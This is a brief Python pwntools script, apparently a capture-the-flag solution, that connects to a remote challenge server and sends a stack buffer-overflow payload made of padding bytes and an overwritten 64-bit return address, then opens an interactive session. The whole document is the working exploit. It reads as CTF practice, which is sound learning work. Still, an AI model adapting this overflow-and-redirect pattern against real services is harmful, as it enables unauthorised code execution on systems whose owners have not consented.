from pwn import *

# io = process('./pwn2')

io = remote("ctf.mardle.cn", 34411)  # 填写对应环境的ip地址和端口号

payload = b"a" * (20 + 0x50 + 0x8) + p64(0x400200)

io.recvline("Enter your name: ")

io.send(payload)
print(io.recvall())

io.interactive()
io.close()
